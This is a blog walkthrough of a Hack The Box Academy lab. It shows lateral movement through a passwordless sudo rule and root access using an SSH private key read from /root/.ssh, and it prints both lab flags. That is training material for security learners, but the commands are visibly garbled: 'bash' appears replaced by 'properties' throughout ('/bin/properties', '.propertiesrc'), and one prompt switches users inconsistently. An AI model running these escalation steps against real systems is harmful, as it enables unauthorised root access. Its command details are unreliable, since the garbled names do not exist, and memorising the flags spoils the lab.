# Privilege Escalation

Sunday, July 7, 2024 | 4 minutes

### [Intro](https://k0rg.com/posts/boxes/hackthebox/privilegeescalation/#intro)

Today’s walkthrough goes over some basics with lateral movement and privilege escalation. We’re not too far into the weeds of enumeration yet, but let’s dive in.

This box can be found here: [Hack The Box - Academy](https://academy.hackthebox.com/module/77/section/844) - (you will need active access to HTB Academy)

### [Research](https://k0rg.com/posts/boxes/hackthebox/privilegeescalation/#research)

We’re given a box to ssh into, with the user: `user1` and password `password1`. Our task is to SSH to the server with the provided credentials and, after logging in, try to find a way to move to `user2`, to get the flag in `/home/user2/flag.txt`.

So, let’s connect using SSH:

```properties
──(k0rg㉿kali)-[~]
└─$ ssh user1@10.10.10.10 -p 33333
The authenticity of host '[10.10.10.10]:33333 ([10.10.10.10]:33333)' cant be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.10]:33333' (ED25519) to the list of known hosts.
(user1@10.10.10.10) Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)
...
user1@htb-privesc:~$
```

Upon connecting, let’s get a lay of the land. We’re connected as `user1` and our `home` directory is empty. We change directories and check the home directory for `user2` and find the `flag.txt` we’re looking for:

```properties
user1@htb-privesc:~$ whoami
user1
user1@htb-privesc:~$ ls
user1@htb-privesc:~$ cd ..
user1@htb-privesc:/home$ ls
user1  user2
user1@htb-privesc:/home$ cd user2
user1@htb-privesc:/home/user2$ ls
flag.txt
```

### [First Flag](https://k0rg.com/posts/boxes/hackthebox/privilegeescalation/#first-flag)

We check if we can just view the flag and, expectedly, get a permission denied error:

```properties
user1@htb-privesc:/home/user2$ cat flag.txt 
cat: flag.txt: Permission denied
```

This is a beginner-level box, so we likely don’t need to go too deep on enumeration. Let’s start with checking user privileges:

```properties
user1@htb-privesc:/home/user2$ sudo -l
Matching Defaults entries for user1 on htb-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on htb-privesc:
    (user2 : user2) NOPASSWD: /bin/properties
```

A pretty obvious “vulnerability” here is that we can run `properties`, using no password, in the context of user2. This should let us read files for that user as well:

```properties
user1@htb-privesc:/home/user2$ sudo -u user2 /bin/properties
user2@htb-privesc:~$ ls
flag.txt
user2@htb-privesc:~$ cat flag.txt 
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

And, sure enough, we can now read our first flag. Note in the above, how our prompt changes from the context of `user1` to `user2` after running the `sudo -u` command.

### [Second Flag](https://k0rg.com/posts/boxes/hackthebox/privilegeescalation/#second-flag)

The next task we’re given is “Once you gain access to ‘user2’, try to find a way to escalate your privileges to root, to get the flag in `/root/flag.txt`.”

Now that we’re running as `user2`, let’s check our access to the file:

```properties
user2@htb-privesc:~$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied
```

We can’t check permissions like before, because we don’t know `user2`’s password. We’re going to look at everything in `/root/` to see what permissions we now have:

```properties
user2@htb-privesc:/root$ ls -la
total 32
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-xr-x 1 root root  4096 Jul 22 20:45 ..
-rwxr-x--- 1 root user2    5 Aug 19  2020 .properties_history
-rwxr-x--- 1 root user2 3106 Dec  5  2019 .propertiesrc
-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
-rw------- 1 root root    33 Feb 12  2021 flag.txt
```

Looks like we have access to the `.ssh` folder. Let’s use that to our advantage. We copy the `id_rsa` key in `/root/.ssh` to our local system. We learn earlier in the lesson for this section about using the private keys found in a user’s `.ssh` directory.

We’re going to copy the private key to our local system and then SSH back into our target, as the `root` user, using the private key.

```properties
user2@htb-privesc:/root/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
...
...
QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
-----END OPENSSH PRIVATE KEY-----
user1@htb-privesc:/home/user2$ exit
logout
Connection to 10.10.10.10 closed.
```

After creating the key on our local system, we need to change the permissions, so that SSH doesn’t refuse the connection:

```properties
k0rg@kali[/htb]$ vim id_rsa
k0rg@kali[/htb]$ chmod 600 id_rsa
k0rg@kali$ ssh root@10.10.10.10 -p 33333 -i id_rsa
```

### [Success](https://k0rg.com/posts/boxes/hackthebox/privilegeescalation/#success)

Lastly, we check our user, and then read our flag!

```properties
root@htb-privesc:~# whoami
root
root@htb-privesc:~# cat flag.txt 
HTB{pr1v1l363_35c4l4710n_2_r007}
```